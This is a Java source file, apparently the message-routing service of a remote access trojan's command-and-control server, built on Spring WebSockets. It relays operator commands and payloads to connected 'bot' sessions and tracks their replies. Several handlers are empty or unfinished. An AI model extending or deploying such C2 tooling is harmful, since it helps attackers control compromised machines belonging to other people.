package devs.alex.sah.rat.c2server.services.impl;

import devs.alex.sah.rat.c2server.models.AssociativePair;
import devs.alex.sah.rat.c2server.utils.Utils;
import lombok.extern.slf4j.Slf4j;
import devs.alex.sah.rat.c2server.configuration.MessagesConfiguration;
import devs.alex.sah.rat.c2server.models.Message;
import devs.alex.sah.rat.c2server.services.MessagesCoordinator;
import devs.alex.sah.rat.c2server.services.WebSocketSessionService;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Service;
import org.springframework.web.socket.BinaryMessage;
import org.springframework.web.socket.PongMessage;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.io.IOException;
import java.util.UUID;

@Slf4j
@Service
public class MessagesCoordinatorImpl implements MessagesCoordinator {


    private final WebSocketSessionService botWSSessionService;
    private final WebSocketSessionService userWSSessionService;
    private final MessagesConfiguration config;
    public MessagesCoordinatorImpl(@Qualifier("botWebSocketSessionService") WebSocketSessionService botWSSessionService,
                                   @Qualifier("userWebSocketSessionService") WebSocketSessionService userWSSessionService,
                                   MessagesConfiguration constants) {
        this.botWSSessionService = botWSSessionService;
        this.userWSSessionService = userWSSessionService;
        this.config = constants;
    }

    @Override
    public void handleBotTextMessage(WebSocketSession session, TextMessage message) {
        Message<String> parsedMessage = Utils.parseMessage(message);
    }

    @Override
    public void handleBotBinaryMessage(WebSocketSession session, BinaryMessage message) {

    }

    @Override
    public void handleUserTextMessage(WebSocketSession session, TextMessage message) {
        Message<String> parsedMessage = Utils.parseMessage(message);

        if(parsedMessage.params().get(config.RECIPIENT_TYPE).equals("S")) {
            // TODO
        } else{
            String packageType = parsedMessage.params().get(config.PACKAGE_TYPE);
            String recipientID = parsedMessage.params().get("ID");
            String senderRequestId = parsedMessage.params().get("REQ");

            WebSocketSession recipientSession = parsedMessage.params().get(config.RECIPIENT_TYPE).equals("B") ?
                    botWSSessionService.getSession(recipientID) : userWSSessionService.getSession(recipientID);

            if(packageType.equals("con")){
                String envelope = (String)recipientSession.getAttributes().get("CE-"+ senderRequestId);
                sendTextMessage(recipientSession, envelope, parsedMessage.getPayload());
                return;
            }

            if(packageType.equals("last")){
                String envelope = (String)recipientSession.getAttributes().get("LE-"+ senderRequestId);
                sendTextMessage(recipientSession, envelope, parsedMessage.getPayload());

                recipientSession.getAttributes().remove("CE-" + senderRequestId);
                recipientSession.getAttributes().remove("LE-" + senderRequestId);
                return;
            }

            String requiredResponse = parsedMessage.params().get(config.RESPONSE_TYPE);
            String module = parsedMessage.params().get(config.MODULE);
            String recipientType = parsedMessage.params().get(config.RECIPIENT_TYPE);


            String association = recipientType.equals("H") ?
                    (String)session.getAttributes().get("userId") : UUID.randomUUID().toString();

            if(packageType.equals("first")){
                recipientSession.getAttributes()
                        .put("CE-" + senderRequestId, Utils.generateBotEnvelope("con", module, association));
                recipientSession.getAttributes()
                        .put("LE-" + senderRequestId, Utils.generateBotEnvelope("last", module, association));
            }

            if(recipientType.equals("H")){
                sendTextMessage(recipientSession, Utils.generateUserEnvelope(packageType, module, association, requiredResponse), parsedMessage.getPayload());
            } else{
                sendTextMessage(recipientSession, Utils.generateBotEnvelope(packageType, module, association, requiredResponse), parsedMessage.getPayload());

                if(!requiredResponse.equals("none")) {
                    recipientSession.getAttributes().put(association, new AssociativePair((String) session.getAttributes().get("userId"), senderRequestId));
                }
            }
        }
    }

    @Override
    public void handleUserBinaryMessage(WebSocketSession session, BinaryMessage message) {

    }

    @Override
    public void sendTextMessage(WebSocketSession recipientSession, String envelope, String payload) {
        try{
            recipientSession.sendMessage(new TextMessage(envelope + payload));
        }catch (IOException e){
            log.error("Fault send message. Message envelope: {}. Error: {}", envelope, e.getMessage());
        }
    }

    @Override
    public void sendBinaryMessage(WebSocketSession session, BinaryMessage message) {

    }


    @Override
    public void handlePongMessage(WebSocketSession session, PongMessage message) {

    }



}
